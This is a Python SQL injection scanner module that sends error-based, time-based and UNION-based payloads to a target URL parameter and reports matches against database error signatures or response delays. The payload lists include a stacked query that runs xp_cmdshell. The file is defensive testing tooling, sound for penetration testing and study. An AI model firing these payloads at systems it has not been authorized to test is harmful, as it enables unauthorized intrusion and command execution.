#!/usr/bin/env python3
"""
SQL Injection Scanner Module
Author: Olanite Daniel Pelumi
"""

import requests
import time
import urllib.parse
from datetime import datetime


class SQLiScanner:
    """SQL Injection vulnerability scanner with multiple detection methods."""
    
    def __init__(self, target_url, parameter, method='GET'):
        self.target_url = target_url
        self.parameter = parameter
        self.method = method.upper()
        self.results = []
        self.vulnerable = False
        
        # SQL Injection payloads database
        self.payloads = {
            'error_based': [
                "'",
                "''",
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' OR 1=1#",
                "') OR ('1'='1",
                "')) OR (('1'='1",
                "'; EXEC xp_cmdshell 'dir'--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
            ],
            'time_based': [
                ("' AND SLEEP(5)--", 5),
                ("'; WAITFOR DELAY '0:0:5'--", 5),
                ("' AND pg_sleep(5)--", 5),
                ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4,5--",
            ]
        }
        
        # Database error signatures
        self.error_signatures = [
            "sql syntax",
            "mysql_fetch",
            "ORA-",
            "Oracle",
            "PostgreSQL",
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite",
            "syntax error",
            "unterminated",
            "quoted string not properly terminated",
            "You have an error in your SQL syntax",
            "mysql_num_rows()",
            "mysql_fetch_array()",
            "pg_query()",
            "mssql_query()",
        ]
    
    def test_error_based(self):
        """Test for error-based SQL injection vulnerabilities."""
        print(f"[*] Testing error-based SQLi on {self.target_url}")
        
        for payload in self.payloads['error_based']:
            try:
                if self.method == 'GET':
                    parsed = urllib.parse.urlparse(self.target_url)
                    params = urllib.parse.parse_qs(parsed.query)
                    params[self.parameter] = payload
                    
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=new_query)
                    )
                    
                    response = requests.get(test_url, timeout=10)
                else:
                    data = {self.parameter: payload}
                    response = requests.post(self.target_url, data=data, timeout=10)
                
                response_text = response.text.lower()
                
                for error in self.error_signatures:
                    if error.lower() in response_text:
                        self.vulnerable = True
                        self.results.append({
                            'type': 'Error-based SQL Injection',
                            'payload': payload,
                            'evidence': f"Database error detected: {error}",
                            'severity': 'High',
                            'status_code': response.status_code
                        })
                        return True
                        
            except requests.RequestException:
                continue
                
        return False
    
    def test_time_based(self):
        """Test for time-based blind SQL injection."""
        print(f"[*] Testing time-based blind SQLi")
        
        for payload, sleep_time in self.payloads['time_based']:
            try:
                start_time = time.time()
                
                if self.method == 'GET':
                    parsed = urllib.parse.urlparse(self.target_url)
                    params = urllib.parse.parse_qs(parsed.query)
                    params[self.parameter] = payload
                    
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=new_query)
                    )
                    
                    requests.get(test_url, timeout=sleep_time + 3)
                else:
                    data = {self.parameter: payload}
                    requests.post(self.target_url, data=data, timeout=sleep_time + 3)
                
                elapsed = time.time() - start_time
                
                if elapsed >= sleep_time:
                    self.vulnerable = True
                    self.results.append({
                        'type': 'Time-based Blind SQL Injection',
                        'payload': payload,
                        'evidence': f"Response delayed by {elapsed:.2f} seconds (expected {sleep_time}s)",
                        'severity': 'High',
                        'delay': elapsed
                    })
                    return True
                    
            except requests.Timeout:
                # Timeout might indicate vulnerability
                pass
            except requests.RequestException:
                continue
                
        return False
    
    def test_union_based(self):
        """Test for UNION-based SQL injection."""
        print(f"[*] Testing UNION-based SQLi")
        
        # Get baseline response
        try:
            if self.method == 'GET':
                baseline_response = requests.get(self.target_url, timeout=10)
            else:
                data = {self.parameter: "normal_value"}
                baseline_response = requests.post(self.target_url, data=data, timeout=10)
            
            baseline_length = len(baseline_response.text)
        except requests.RequestException:
            return False
        
        # Test UNION payloads
        for payload in self.payloads['union_based']:
            try:
                if self.method == 'GET':
                    parsed = urllib.parse.urlparse(self.target_url)
                    params = urllib.parse.parse_qs(parsed.query)
                    params[self.parameter] = payload
                    
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=new_query)
                    )
                    
                    response = requests.get(test_url, timeout=10)
                else:
                    data = {self.parameter: payload}
                    response = requests.post(self.target_url, data=data, timeout=10)
                
                # Check for UNION indicators
                response_text = response.text
                indicators = ['1', '2', '3', 'NULL', 'union', 'select']
                
                # If response length changed significantly or contains indicators
                if abs(len(response_text) - baseline_length) > 50:
                    for indicator in indicators:
                        if indicator in response_text and indicator not in baseline_response.text:
                            self.vulnerable = True
                            self.results.append({
                                'type': 'UNION-based SQL Injection',
                                'payload': payload,
                                'evidence': f"Response structure changed, possible UNION injection",
                                'severity': 'High',
                                'response_length': len(response_text)
                            })
                            return True
                            
            except requests.RequestException:
                continue
                
        return False
    
    def scan(self):
        """Run complete SQL injection scan."""
        print(f"[+] Starting SQL injection scan")
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Parameter: {self.parameter}")
        print(f"[+] Method: {self.method}")
        print("-" * 50)
        
        # Run all detection methods
        self.test_error_based()
        self.test_time_based()
        self.test_union_based()
        
        scan_result = {
            'target': self.target_url,
            'parameter': self.parameter,
            'method': self.method,
            'scan_time': datetime.now().isoformat(),
            'vulnerable': self.vulnerable,
            'findings': self.results,
            'total_payloads_tested': (
                len(self.payloads['error_based']) + 
                len(self.payloads['time_based']) + 
                len(self.payloads['union_based'])
            ),
            'scan_duration': None  # Can be added if needed
        }
        
        print(f"[+] Scan completed. Vulnerabilities found: {len(self.results)}")
        
        return scan_result
